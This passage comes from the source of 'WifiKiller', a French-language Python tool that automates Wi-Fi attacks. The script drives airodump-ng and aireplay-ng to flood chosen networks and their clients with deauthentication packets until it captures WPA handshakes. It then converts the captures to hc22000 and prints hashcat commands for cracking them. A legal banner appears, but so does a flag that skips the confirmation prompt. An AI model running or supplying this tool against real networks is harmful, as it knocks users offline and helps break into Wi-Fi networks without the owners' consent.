        ]
        for pattern in patterns:
            if os.path.exists(pattern):
                return pattern
        # Glob search
        caps = glob.glob(f"{prefix}*.cap") + glob.glob(f"{prefix}*.pcap")
        if caps:
            return caps[0]
        return f"{prefix}-01.cap"

    def attack_network(self, target, index, total):
        """Perform deauth attack on a single network to capture handshake."""
        essid_display = target.essid[:20]
        console.print(f"\n[{STYLE_HEADER}]┌── Attaque {index}/{total} : {essid_display} ({target.bssid}) ──┐[/{STYLE_HEADER}]")

        # Capture file path
        safe_essid = re.sub(r'[^\w\-.]', '_', target.essid)
        cap_prefix = str(self.session_dir / f"{safe_essid}_{target.bssid.replace(':', '')}")
        cap_file = f"{cap_prefix}-01.cap"

        # Start airodump-ng capturing on the target's channel
        console.print(f"  [{STYLE_INFO}]📡 Capture sur canal {target.channel}...[/{STYLE_INFO}]")
        airodump_cmd = (
            f"airodump-ng {self.monitor_interface} "
            f"--bssid {target.bssid} "
            f"--channel {target.channel} "
            f"--write {cap_prefix} "
            f"--output-format pcap "
            f"--write-interval 1"
        )
        airodump_proc = run_cmd_bg(airodump_cmd)
        time.sleep(3)  # Let airodump-ng start up

        handshake_found = False

        try:
            with Progress(
                SpinnerColumn(spinner_name="dots12", style="bright_cyan"),
                TextColumn("[bold white]{task.description}"),
                BarColumn(bar_width=30, complete_style="bright_green", finished_style="green"),
                TextColumn("[bright_cyan]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console,
                transient=False,
            ) as progress:

                task = progress.add_task(
                    f"  Deauth → {essid_display}",
                    total=DEAUTH_ROUNDS * DEAUTH_PACKETS,
                )

                for round_num in range(DEAUTH_ROUNDS):
                    # Send deauth to broadcast (all clients)
                    deauth_cmd = (
                        f"aireplay-ng --deauth {DEAUTH_PACKETS} "
                        f"-a {target.bssid} "
                        f"{self.monitor_interface}"
                    )
                    run_cmd(deauth_cmd, timeout=30)
                    progress.advance(task, DEAUTH_PACKETS)

                    # Also send targeted deauth to known clients
                    for client in self.clients:
                        if client.bssid.upper() == target.bssid.upper():
                            targeted_cmd = (
                                f"aireplay-ng --deauth 5 "
                                f"-a {target.bssid} "
                                f"-c {client.station_mac} "
                                f"{self.monitor_interface}"
                            )
                            run_cmd(targeted_cmd, timeout=15)

                    # Check for handshake after each round
                    actual_cap = self._find_cap_file(cap_prefix)
                    if self._check_handshake(actual_cap, target.bssid):
                        handshake_found = True
                        progress.update(task, completed=DEAUTH_ROUNDS * DEAUTH_PACKETS)
                        break

                    time.sleep(2)

            # If not found yet, wait a bit more
            if not handshake_found:
                console.print(f"  [{STYLE_INFO}]⏳ Attente du handshake ({HANDSHAKE_TIMEOUT}s max)...[/{STYLE_INFO}]")
                deadline = time.time() + HANDSHAKE_TIMEOUT
                while time.time() < deadline:
                    actual_cap = self._find_cap_file(cap_prefix)
                    if self._check_handshake(actual_cap, target.bssid):
                        handshake_found = True
                        break
                    # Send additional deauths periodically
                    if int(time.time()) % 10 == 0:
                        deauth_cmd = (
                            f"aireplay-ng --deauth {DEAUTH_PACKETS} "
                            f"-a {target.bssid} "
                            f"{self.monitor_interface}"
                        )
                        run_cmd(deauth_cmd, timeout=15)
                    time.sleep(3)

        finally:
            # Stop airodump-ng
            kill_process_group(airodump_proc)

        actual_cap = self._find_cap_file(cap_prefix)

        if handshake_found and os.path.exists(actual_cap):
            target.handshake_captured = True
            target.handshake_file = actual_cap
            console.print(f"  [{STYLE_SUCCESS}]🤝 HANDSHAKE CAPTURÉ ! → {actual_cap}[/{STYLE_SUCCESS}]")
        else:
            console.print(f"  [{STYLE_WARNING}]⚠ Handshake non capturé pour {essid_display}.[/{STYLE_WARNING}]")
            console.print(f"  [{STYLE_DIM}]  (Aucun client connecté ou signal trop faible)[/{STYLE_DIM}]")

        return handshake_found

    def attack_targets(self, targets):
        """Run deauth attacks on all selected targets."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 5/6 : Attaques Deauth & Capture ━━━[/{STYLE_HEADER}]")
        console.print(f"[{STYLE_DIM}]Lancement des attaques sur {len(targets)} réseau(x)...[/{STYLE_DIM}]")

        captured = 0
        for i, target in enumerate(targets, 1):
            if self.attack_network(target, i, len(targets)):
                captured += 1

        console.print(f"\n[{STYLE_SUCCESS}]✔ Attaques terminées. Handshakes capturés : {captured}/{len(targets)}[/{STYLE_SUCCESS}]")
        return captured

    # ────────────────────────────────────────────────────────────
    #  STEP 6: CONVERT TO HC22000
    # ────────────────────────────────────────────────────────────

    def convert_to_hc22000(self, targets):
        """Convert captured handshake files to hc22000 format for hashcat."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 6/6 : Conversion hc22000 ━━━[/{STYLE_HEADER}]")

        captured_targets = [t for t in targets if t.handshake_captured and t.handshake_file]

        if not captured_targets:
            console.print(f"[{STYLE_WARNING}]⚠ Aucun handshake à convertir.[/{STYLE_WARNING}]")
            return

        converted = 0
        with Progress(
            SpinnerColumn(spinner_name="dots12", style="bright_cyan"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=30, complete_style="bright_magenta", finished_style="magenta"),
            TextColumn("[bright_cyan]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:

            task = progress.add_task("Conversion en hc22000...", total=len(captured_targets))

            for target in captured_targets:
                safe_essid = re.sub(r'[^\w\-.]', '_', target.essid)
                hc_file = str(Path(HASHCAT_DIR) / f"{safe_essid}_{target.bssid.replace(':', '')}.hc22000")

                # Enhanced command with -E (to ignore some errors) and -o for output
                # We also redirect stderr to see what's wrong
                convert_cmd = f"hcxpcapngtool -o \"{hc_file}\" \"{target.handshake_file}\" -E"
                ret, stdout, stderr = run_cmd(convert_cmd)

                # Check if file was created and is not empty
                if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
                    target.hc22000_file = hc_file
                    converted += 1
                    console.print(f"  [{STYLE_SUCCESS}]✔[/{STYLE_SUCCESS}] {target.essid} → [bright_cyan]{hc_file}[/bright_cyan]")
                else:
                    console.print(f"  [{STYLE_ERROR}]✘[/{STYLE_ERROR}] {target.essid} - Échec de conversion")
                    if "handshake" in (stdout + stderr).lower():
                        console.print(f"    [{STYLE_DIM}]Note: hcxpcapngtool n'a pas pu extraire de hash valide malgré la capture.[/{STYLE_DIM}]")
                    elif stderr:
                        console.print(f"    [{STYLE_DIM}]Erreur: {stderr.strip()[:150]}[/{STYLE_DIM}]")

                progress.advance(task)

        console.print(f"\n[{STYLE_SUCCESS}]✔ {converted}/{len(captured_targets)} fichier(s) converti(s) en hc22000.[/{STYLE_SUCCESS}]")

    # ────────────────────────────────────────────────────────────
    #  SUMMARY & CLEANUP
    # ────────────────────────────────────────────────────────────

    def print_summary(self, targets):
        """Print a final summary of the session."""
        elapsed = datetime.now() - self.start_time
        elapsed_str = str(elapsed).split('.')[0]

        console.print(f"\n{'═' * 60}")
        console.print()

        # Summary table
        table = Table(
            title="📋 Résumé de la session WifiKiller",
            box=box.DOUBLE_EDGE,
            border_style="bright_cyan",
            title_style="bold bright_cyan",
            header_style="bold bright_white on dark_blue",
            expand=True,
        )
        table.add_column("Réseau (ESSID)", style="bright_white")
        table.add_column("BSSID", style="dim cyan")
        table.add_column("Handshake", justify="center")
        table.add_column("HC22000", justify="center")
        table.add_column("Fichier", style="dim")

        for t in targets:
            hs_status = "[bright_green]✔ Capturé[/bright_green]" if t.handshake_captured else "[red]✘ Échec[/red]"
            hc_status = "[bright_green]✔ Converti[/bright_green]" if t.hc22000_file else "[red]✘ N/A[/red]"
            hc_path = t.hc22000_file if t.hc22000_file else "-"

            table.add_row(t.essid, t.bssid, hs_status, hc_status, hc_path)

        console.print(table)

        # Stats
        captured = sum(1 for t in targets if t.handshake_captured)
        converted = sum(1 for t in targets if t.hc22000_file)

        stats = Panel(
            f"[bright_white]"
            f"  ⏱  Durée totale      : [bright_cyan]{elapsed_str}[/bright_cyan]\n"
            f"  📡 Réseaux scannés   : [bright_cyan]{len(self.networks)}[/bright_cyan]\n"
            f"  🎯 Réseaux ciblés    : [bright_cyan]{len(targets)}[/bright_cyan]\n"
            f"  🤝 Handshakes captés : [bright_green]{captured}[/bright_green]\n"
            f"  #️  Fichiers HC22000  : [bright_magenta]{converted}[/bright_magenta]\n"
            f"  📂 Dossier session   : [dim]{self.session_dir}[/dim]"
            f"[/bright_white]",
            title="Statistiques",
            border_style="bright_yellow",
            box=box.ROUNDED,
        )
        console.print(stats)

        if converted > 0:
            hashcat_hint = Panel(
                "[bright_white]Pour cracker les handshakes avec hashcat :\n\n"
                f"  [bright_green]hashcat -m 22000 {HASHCAT_DIR}/*.hc22000 /path/to/wordlist.txt[/bright_green]\n\n"
                "Ou avec des règles :\n\n"
                f"  [bright_green]hashcat -m 22000 {HASHCAT_DIR}/*.hc22000 /path/to/wordlist.txt -r /path/to/rules.rule[/bright_green]"
                "[/bright_white]",
                title="💡 Prochaine étape : Hashcat",
                border_style="bright_green",
                box=box.ROUNDED,
            )
            console.print(hashcat_hint)

    def cleanup(self):
        """Restore interface and clean up."""
        # Stop any running scan
        if self.scan_process:
            kill_process_group(self.scan_process)

        # Restore interface
        if self.monitor_interface:
            console.print(f"\n[{STYLE_INFO}]🔧 Restauration de l'interface...[/{STYLE_INFO}]")
            run_cmd(f"airmon-ng stop {self.monitor_interface}")

            # Restart NetworkManager
            run_cmd("systemctl start NetworkManager 2>/dev/null")
            run_cmd("systemctl start wpa_supplicant 2>/dev/null")
            console.print(f"[{STYLE_SUCCESS}]✔ Interface restaurée. NetworkManager redémarré.[/{STYLE_SUCCESS}]")

        # Clean temp files
        cleanup_temp_files()

    # ────────────────────────────────────────────────────────────
    #  MAIN RUN
    # ────────────────────────────────────────────────────────────

    def run(self):
        """Main execution flow."""
        console.print(BANNER.format(version=VERSION))
        console.print(Panel(
            "[bright_white]WifiKiller automatise le processus de capture de handshakes Wi-Fi.\n"
            "Utilise cet outil uniquement sur des réseaux que tu es autorisé à tester.[/bright_white]",
            border_style="bright_red",
            box=box.HEAVY,
            title="⚠ Avertissement légal",
            title_align="center",
        ))

        try:
            # Step 1: Check Kill
            self.check_kill()

            # Step 2: Select interface
            self.select_interface()

            # Step 3: Monitor mode
            self.enable_monitor_mode()

            # Step 4: Scan networks
            self.scan_networks()

            # Step 5: Select targets & attack
            targets = self.display_and_select_targets()

            # Confirm before attacking
            console.print()
            confirm = console.input(
                f"[{STYLE_WARNING}]⚠ Lancer les attaques deauth sur {len(targets)} réseau(x) ? (o/N) : [/{STYLE_WARNING}]"
            ).strip().lower()

            if confirm not in ('o', 'oui', 'y', 'yes'):
                console.print(f"[{STYLE_WARNING}]Attaques annulées.[/{STYLE_WARNING}]")
                self.cleanup()
                sys.exit(0)

            # Step 5b: Attack
            self.attack_targets(targets)

            # Step 6: Convert to hc22000
            self.convert_to_hc22000(targets)

            # Summary
            self.print_summary(targets)

        except KeyboardInterrupt:
            console.print(f"\n[{STYLE_WARNING}]Interruption. Nettoyage...[/{STYLE_WARNING}]")
        except Exception as e:
            console.print(f"\n[{STYLE_ERROR}]✘ Erreur inattendue : {e}[/{STYLE_ERROR}]")
            import traceback
            console.print(f"[{STYLE_DIM}]{traceback.format_exc()}[/{STYLE_DIM}]")
        finally:
            self.cleanup()

        console.print(f"\n[{STYLE_HEADER}]Merci d'avoir utilisé WifiKiller ! 🐺[/{STYLE_HEADER}]\n")


# ════════════════════════════════════════════════════════════════
#  ARGUMENT PARSER
# ════════════════════════════════════════════════════════════════

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WifiKiller - Advanced Wi-Fi Auditing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Exemples:
  sudo python3 wifikiller.py                     # Mode interactif
  sudo python3 wifikiller.py -i wlan0            # Spécifie l'interface
  sudo python3 wifikiller.py --deauth-count 20   # Plus de paquets deauth
  sudo python3 wifikiller.py --timeout 120       # Timeout handshake plus long
        """,
    )
    parser.add_argument("-i", "--interface", help="Interface Wi-Fi à utiliser")
    parser.add_argument("--deauth-count", type=int, default=DEAUTH_PACKETS,
                        help=f"Nombre de paquets deauth par burst (défaut: {DEAUTH_PACKETS})")
    parser.add_argument("--deauth-rounds", type=int, default=DEAUTH_ROUNDS,
                        help=f"Nombre de rounds de deauth (défaut: {DEAUTH_ROUNDS})")
    parser.add_argument("--timeout", type=int, default=HANDSHAKE_TIMEOUT,
                        help=f"Timeout en secondes pour la capture du handshake (défaut: {HANDSHAKE_TIMEOUT}s)")
    parser.add_argument("-g", "--group", action="store_true",
                        help="Grouper les réseaux par ESSID (masque les doublons d'AP)")
    parser.add_argument("--no-confirm", action="store_true",
                        help="Ne pas demander de confirmation avant l'attaque")
    parser.add_argument("-v", "--version", action="version", version=f"WifiKiller v{VERSION}")

    return parser.parse_args()


# ════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Parse arguments
    args = parse_args()

    # Apply argument overrides
    if args.deauth_count:
        DEAUTH_PACKETS = args.deauth_count
    if args.deauth_rounds:
        DEAUTH_ROUNDS = args.deauth_rounds
    if args.timeout:
        HANDSHAKE_TIMEOUT = args.timeout

    # Check root
    check_root()

    # Check dependencies
    check_dependencies()

    # Run
    killer = WifiKiller(args)

    # If interface specified via CLI, set it
    if args.interface:
        killer.interface = args.interface

    killer.run()
